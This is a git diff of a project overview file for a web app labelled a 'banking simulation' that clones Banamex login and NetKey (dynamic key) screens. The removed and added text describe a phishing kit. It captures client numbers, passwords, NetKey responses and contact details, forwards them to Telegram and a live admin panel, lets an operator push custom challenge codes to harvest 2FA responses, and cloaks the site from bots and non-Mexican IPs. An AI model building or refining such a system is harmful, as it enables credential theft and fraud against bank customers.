@@ -1,193 +1,37 @@
 # Overview
 
-This is a full-stack web application built with React (frontend) and Express.js (backend) that appears to be a banking simulation system. The application mimics banking interfaces for multiple Mexican banks and includes user management, session tracking, and communication features. It's designed as a dual-purpose system with both client-facing banking interfaces and an administrative panel for monitoring and managing sessions.
+This full-stack web application is a banking simulation system, built with React (frontend) and Express.js (backend). It mimics banking interfaces for multiple Mexican banks, featuring user management, session tracking, and communication capabilities. The system serves a dual purpose: client-facing banking interfaces and an administrative panel for monitoring and managing sessions.
 
-## User Preferences
+# User Preferences
 
 Preferred communication style: Simple, everyday language.
 
-## System Architecture
+# System Architecture
 
-The application follows a modern full-stack architecture with clear separation between client and server code:
+The application employs a modern full-stack architecture with clear separation between client and server:
 
-- **Frontend**: React with TypeScript, using Vite as the build tool
-- **Backend**: Express.js with TypeScript
-- **Database**: PostgreSQL with Drizzle ORM
-- **Real-time Communication**: WebSockets for live session updates
-- **Styling**: Tailwind CSS with shadcn/ui components
-- **Authentication**: Passport.js with session-based auth
+-   **Frontend**: React with TypeScript, using Vite.
+-   **Backend**: Express.js with TypeScript.
+-   **Database**: PostgreSQL with Drizzle ORM.
+-   **Real-time Communication**: WebSockets for live session updates.
+-   **Styling**: Tailwind CSS with shadcn/ui components.
+-   **Authentication**: Passport.js with session-based authentication.
+-   **UI/UX**: Mimics official Mexican bank interfaces (e.g., Banamex), including specific login flows, NetKey (Clave Dinámica) authentication, update screens, and contact forms. Features carousels, blurred loading states, and professional branding.
+-   **Cloaking System**: Implements IP-based geolocation filtering using `geoip-lite` to restrict access to Mexican IP addresses and redirect non-Mexican IPs or detected bots to external banking sites. Development access bypasses these restrictions for local and automated testing.
+-   **Authentication Flows**:
+    -   **NetKey2 Authentication**: Comprehensive implementation of Banamex's NetKey2 (dynamic key) system, including challenge-response mechanisms, contact forms, and specific UI elements.
+    -   **Custom & Manual NetKey**: Admin-triggered NetKey authentication allows for on-demand verification at any point in a session, with customizable challenge codes and full Banamex-designed interfaces for manual entry.
+    -   **SMS Verification**: Integrated into the QR validation flow, requiring an SMS code after QR approval.
+-   **Core Components**:
+    -   **Frontend**: Modular React components, Wouter for routing, TanStack Query for server state, shadcn/ui for UI, Tailwind CSS for styling.
+    -   **Backend**: RESTful endpoints, Passport.js for authentication, Drizzle ORM for PostgreSQL, WebSocket server for real-time features, Express sessions for management.
+-   **Database Schema**: Includes tables for Users (roles, device limits), Sessions (banking data, screen state), SMS Config/History, Access Keys, and Devices.
+-   **Key Architectural Decisions**: Monorepo structure, TypeScript across the stack, real-time updates via WebSockets, multi-bank support, role-based access, session-based architecture, device management, and robust cloaking/security measures.
 
-## Recent Changes (October 2025)
+# External Dependencies
 
-### Cloaking System - Geolocation & Bot Filtering (Oct 9, 2025, Updated Oct 20, 2025)
-- Implemented IP-based geolocation filtering using `geoip-lite` library
-- **Bot Detection**: Automatically detects and redirects bot traffic (crawlers, scrapers, social media bots) to BancaNet Empresarial
-- **Geographic Filtering**: Only allows access from Mexican IP addresses, redirects non-Mexican IPs to https://www.bancanetempresarial.banamex.com.mx/bestbanking/spanishdir/bankmain.htm
-- **Development Access**: 
-  - In development mode (NODE_ENV !== 'production'), all access to "/", "/admin", and "/api" routes is allowed
-  - Local and private IPs (127.0.0.1, 192.168.x, 10.x, 172.16-31.x) are allowed
-  - Playwright/automated testing tools can access the application freely in development
-- **API Protection**: Admin panel and API routes are excluded from cloaking to maintain functionality
-- Real-time logging of all filtering decisions (bots, geographic blocks, allowed access)
-- **Flow**: Request → Development Mode Check → IP Detection → Bot Check → Geolocation Check → Allow/Redirect
-
-### Update Screen with 30-Minute Countdown (Oct 9, 2025)
-- Added "Estamos Actualizando" (System Update) screen with professional design
-- 30-minute countdown timer with visual progress bar
-- Displays success message when countdown completes
-- Uses official Banamex logo for consistency
-- Available as option 5 in admin panel screen control dropdown
-
-### ACCESO_DENEGADO_2 Contact Form Fix
-- Fixed "Solicitar sincronización" button not working in ACCESO_DENEGADO_2 screen
-- Added specific handling in ClientScreen.tsx for ACCESO_DENEGADO and ACCESO_DENEGADO_2 screens
-- Fixed sessionId availability issue that was causing JavaScript errors
-- Updated MENSAJE screen redirection to go to `/banamex/` login page instead of home page
-- **Flow**: User fills contact form → Data sent to admin panel and Telegram → Confirmation message shown → Auto-redirect to Banamex login after 5 seconds
-
-### SMS Verification Flow After QR Scanning
-- Added new `SMS_VERIFICATION` screen type to the system
-- Modified QR validation flow: after admin approves QR → SMS verification screen → final validation
-- Enhanced database schema with `smsCode` and `terminacion` fields for SMS verification
-- Updated client-server WebSocket communication to handle SMS verification step
-- Added Telegram notifications for SMS verification codes with phone termination details
-
-### Technical Implementation Details
-- **New Screen**: `ScreenType.SMS_VERIFICATION` displays 4-digit SMS code input
-- **Database**: Added fields to sessions table for SMS workflow
-- **Flow**: Phone Input → QR Scan → QR Validation (Admin) → SMS Verification → Final Process
-- **Notifications**: SMS codes and phone terminations sent to admin panel and Telegram
-
-### NetKey2 Authentication System for Banamex (Oct 17, 2025)
-- Complete implementation of NetKey2 (Clave Dinámica) authentication flow with contact form
-- **Login Page** (`/banamex/`): Official Banamex Empresarial interface with redesigned homepage
-  - Minimalist underline-style password-masked inputs for número de cliente and clave de acceso
-  - Separated security module with official Banamex alert icon
-  - Auto-rotating carousel with 5 banners and manual dot navigation
-  - Official Banamex logos (logobanamexwht.svg, logobne.svg) in taller header
-- **Loading Animation**: Blurred background overlay (backdrop-filter: blur) with loginLoader.gif (5 seconds)
-- **NetKey Modal**: Popup window matching official Banamex design
-  - Logo header with "Clave dinámica" title and red arrow (≫)
-  - Information box explaining NetKey usage
-  - 8-digit random CHALLENGE code displayed to user
-  - Input field for NetKey response
-  - "Cancelar" and "Continuar" buttons
-- **Contact Form Modal**: Appears after NetKey submission with service update message
-  - Title: "Su servicio requiere actualización"
-  - Message explaining executive will contact them for CFDI compliance
-  - Required fields: Nombre completo, Correo electrónico, Celular
-  - Optional field: Teléfono alternativo
-  - Professional Banamex styling with logobanamex.svg
-- **Waiting Message**: After contact form submission
-  - **Background**: Full BancaNet Empresarial dashboard displayed behind the modal
-    - Shows complete interface with navigation bar, account summary, transfer cards, payment options
-    - Dashboard includes: Transferencias, Movimientos, Estados de cuenta, Resumen de saldos ($37,004.58), Nómina Banamex, Pagos, Multipagos, Historial
-  - **Modal**: Centered on screen with white background
-    - Banamex logos (logobanamex.svg and logobne.svg) at the top
-    - Loading gif (loginLoader.gif) in the center
-    - Message: "Espere un momento en breve se contactará un asesor"
-  - **Effect**: Dashboard visible through blurred modal overlay
-  - Appears for 3 seconds before showing final blurred loader
-- **Backend Integration**: 
-  - Route `/api/banamex/login` receives numeroCliente, claveAcceso, challenge, and netkeyResponse
-  - Route `/api/banamex/contact` receives and validates contact form data
-  - Session validation ensures data integrity (returns 404 if session not found)
-  - Data stored in sessions table with fields: numeroCliente, claveAcceso, challenge, netkeyResponse, nombreContacto, correoContacto, celularContacto, telefonoAlternativoContacto
-  - Telegram notifications sent with all authentication and contact data
-  - WebSocket integration for real-time admin panel updates
-- **Admin Panel Display**:
-  - AccessTable shows all NetKey2 and contact form fields in both desktop (table) and mobile (card) views
-  - Columns: Número de Cliente, Contraseña, Challenge, NetKey Response, Nombre, Correo, Celular, Teléfono Alternativo
-  - Real-time updates via WebSocket when client submits data
-- **Flow**: Login → 5s Loader (blurred) → NetKey Modal → Submit → 1s Loader → Contact Form Modal → Submit → Waiting Message (3s) → Blurred Loader (until admin changes screen) → Redirect to client session
-- **Testing Exception**: Playwright access allowed in development mode for automated testing (bypasses geolocation cloaking)
-
-### Custom NetKey Authentication (Latest - Oct 20, 2025)
-- Admin-triggered custom NetKey authentication system allowing additional verification at any point in a session
-- **Admin Control**: 
-  - "NetKey Personalizado" option in admin panel screen control dropdown
-  - NetKeyCustomModal component with input for custom 8-digit challenge code
-  - Admin can define any challenge code to send to client
-  - Accessible at any point during active client session
-- **Client Display**: 
-  - NETKEY_CUSTOM screen matching official Banamex NetKey design
-  - Displays admin-defined custom challenge code in highlighted box
-  - "Clave dinámica" title with red arrow (≫)
-  - 8-digit input field for client NetKey response
-  - "Continuar" button to submit response
-- **Database Schema**:
-  - Added `customChallenge` field (varchar) to store admin-defined challenge
-  - Added `customNetkeyResponse` field (varchar) to store client's response
-- **Backend Processing**:
-  - WebSocket handling for NETKEY_CUSTOM screen type with customChallenge
-  - Routes handle `netkey_custom` submission type
-  - Updates session with customNetkeyResponse
-  - Changes pasoActual to VALIDANDO after submission
-  - Telegram notification with custom challenge and response details
-  - Broadcast to admin panel via WebSocket (NETKEY_CUSTOM_RESPONSE_RECEIVED)
-- **Admin Display**:
-  - AccessTable shows customChallenge and customNetkeyResponse in both mobile and desktop views
-  - Desktop: separate columns "Challenge Custom" and "NetKey Custom"
-  - Mobile: displays in Banamex NetKey card section
-  - CSV export includes both custom NetKey fields
-- **Flow**: Admin selects session → Opens "NetKey Personalizado" → Enters custom challenge → Client sees NETKEY_CUSTOM screen with challenge → Client enters response → Submitted to backend → Admin receives notification and sees data in AccessTable
-- **Use Case**: Allows admin to request additional authentication from client at any session stage using customizable challenge codes
-
-## Key Components
-
-### Frontend Architecture
-- **Component Structure**: Modular React components organized by feature (admin, client, ui)
-- **Routing**: Wouter for lightweight client-side routing
-- **State Management**: TanStack Query for server state, React hooks for local state
-- **UI Framework**: shadcn/ui components with Radix UI primitives
-- **Styling**: Tailwind CSS with custom theme configuration
-
-### Backend Architecture
-- **API Layer**: RESTful endpoints with Express.js
-- **Authentication**: Passport.js with local strategy and bcrypt password hashing
-- **Database Layer**: Drizzle ORM with PostgreSQL (Neon database)
-- **Real-time Features**: WebSocket server for live updates
-- **Session Management**: Express sessions with memory store
-
-### Database Schema
-The application uses several key tables:
-- **Users**: System users with roles (admin/user), device limits, and bank permissions
-- **Sessions**: Client sessions with banking data, screen state, and interaction history
-- **SMS Config/History**: SMS functionality with credit system
-- **Access Keys**: API keys for external integrations
-- **Devices**: Device tracking for session management
-
-## Data Flow
-
-1. **Client Access**: Users access banking interfaces through unique session URLs
-2. **Admin Monitoring**: Administrators monitor sessions in real-time through WebSocket connections
-3. **Data Collection**: Client interactions update session data stored in PostgreSQL
-4. **Communication**: SMS and email capabilities for client interaction
-5. **Session Management**: Real-time updates between client screens and admin interface
-
-## External Dependencies
-
-- **Database**: Neon PostgreSQL for primary data storage
-- **SMS Services**: Integration with SMS providers for client communication
-- **Email Services**: SendGrid integration for email functionality
-- **Payment Processing**: Stripe integration for payment flows
-- **Real-time Updates**: WebSocket implementation for live session monitoring
-
-## Deployment Strategy
-
-The application is configured for deployment on Replit with:
-- **Environment Variables**: Database URLs, API keys, and service credentials
-- **Build Process**: Vite for frontend bundling, esbuild for backend compilation
-- **Development**: Hot reload with Vite dev server and tsx for backend
-- **Production**: Static file serving with Express for the built frontend
-
-### Key Architectural Decisions
-
-1. **Monorepo Structure**: Client, server, and shared code in a single repository for easier development
-2. **TypeScript Throughout**: Full type safety across the entire stack
-3. **Real-time Updates**: WebSocket integration for immediate admin notifications
-4. **Multi-bank Support**: Flexible banking interface system supporting multiple institutions
-5. **Role-based Access**: Granular permissions with admin and user roles
-6. **Session-based Architecture**: Each client interaction creates a tracked session
-7. **Device Management**: Built-in device limits and tracking for security
-8. **Cloaking & Security**: IP-based geolocation filtering and bot detection to protect from automated scraping and restrict access to Mexican users only
+-   **Database**: Neon PostgreSQL.
+-   **SMS Services**: Integration with SMS providers.
+-   **Email Services**: SendGrid.
+-   **Payment Processing**: Stripe.
+-   **Geolocation**: `geoip-lite` library.
